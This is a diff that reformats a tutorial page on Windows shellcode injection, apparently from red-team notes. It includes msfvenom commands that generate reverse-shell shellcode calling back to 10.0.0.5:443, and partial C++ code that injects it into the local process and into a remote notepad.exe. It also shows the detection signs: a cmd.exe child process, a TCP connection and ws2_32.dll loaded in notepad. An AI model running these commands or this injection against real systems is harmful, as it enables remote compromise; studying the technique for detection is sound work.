@@ -16,12 +16,12 @@ Generating shellcode for a reverse shell:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d
 ```
 
-![](../../.gitbook/assets/inject-shellcode.png)
+![[inject-shellcode.png]]
 
 C++ code to injectd and invoke the shellcode:
 
-{% code title="inject-local-process.cpp" %}
 ```cpp
+// inject-local-process.cpp
 #include "stdafx.h"
 #include "Windows.h"
 
@@ -70,28 +70,27 @@ int main()
     return 0;
 }
 ```
-{% endcode %}
 
 Before compiling, for the sake of curiosity, let's have a look at the generated shellcode binary in a disassembler so we can get a rough idea of how our C++ code gets translated into machine code for x64:
 
-![](../../.gitbook/assets/inject-ida.png)
+![[inject-ida.png]]
 
 Also for the sake of curiosity, I wanted to see how the injected shellcode looks in the injected process and to see where it actually is. With a 32-bit shellcode binary \(msfvenom -p windows/shell\_reverse\_tcp LHOST=10.0.0.5 LPORT=443 -f c -b \x00\x0a\x0d\), the shellcode is nicely located in the main thread's stack:
 
-![](../../.gitbook/assets/inject-shellcode-location.png)
+![[inject-shellcode-location.png]]
 
 Back to the x64 bit shellcode - compiling and executing the binary gives us the anticipated reverse shell:
 
-![](../../.gitbook/assets/inject-process.png)
+![[inject-process.png]]
 
-![](../../.gitbook/assets/inject-reverse-shell.png)
+![[inject-reverse-shell.png]]
 
 ## Executing Shellcode in Remote Process
 
 The below code will inject the shellcode into a notepad.exe process with PID 5428 which will initiate a reverse shell back to the attacker:
 
-{% code title="inject-remote-process.cpp" %}
 ```cpp
+// inject-remote-process.cpp
 #include "stdafx.h"
 #include "Windows.h"
 
@@ -147,39 +146,38 @@ int main(int argc, char *argv[])
     return 0;
 }
 ```
-{% endcode %}
 
-{% file src="../../.gitbook/assets/inject1 \(1\).exe" caption="Inject shellcode to Remote Process w/ CreateRemoteThread" %}
+
 
 Below shows notepad before shellcode injection - it has not initiated any TCP connections yet:
 
-![](../../.gitbook/assets/inject-notepad-not-injected.png)
+![[inject-notepad-not-injected.png]]
 
 Once the code is compiled and executed, monitoring the API calls taking place on the system reveals that notepad is doing something it should not ever be doing - spawning a cmd.exe and initiating a TCP connection:
 
-![](../../.gitbook/assets/inject-api-monitoring.png)
+![[inject-api-monitoring.png]]
 
 Checking the notepad in ProcExplorer again reveals an established TCP connection with a cmd.exe as a child:
 
-![](../../.gitbook/assets/inject-notepad-injected.png)
+![[inject-notepad-injected.png]]
 
 Note how the notepad has a `ws2_32.dll` module loaded which should never happen in normal circumstances, since that module is responsible for `sockets` management:
 
-![](../../.gitbook/assets/inject-notepad-dll.png)
+![[inject-notepad-dll.png]]
 
 ## References
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess" %}
+[docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess)
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890\(v=vs.85\).aspx" %}
+[msdn.microsoft.com/en-us/library/windows/desktop/aa366890\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366890\(v=vs.85\).aspx)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights" %}
+[docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights](https://docs.microsoft.com/en-us/windows/desktop/ProcThread/process-security-and-access-rights)
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887\(v=vs.85\).aspx" %}
+[msdn.microsoft.com/en-us/library/windows/desktop/aa366887\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/aa366887\(v=vs.85\).aspx)
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread" %}
+[docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread)
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674\(v=vs.85\).aspx" %}
+[msdn.microsoft.com/en-us/library/windows/desktop/ms681674\(v=vs.85\).aspx](https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674\(v=vs.85\).aspx)
 
 
 
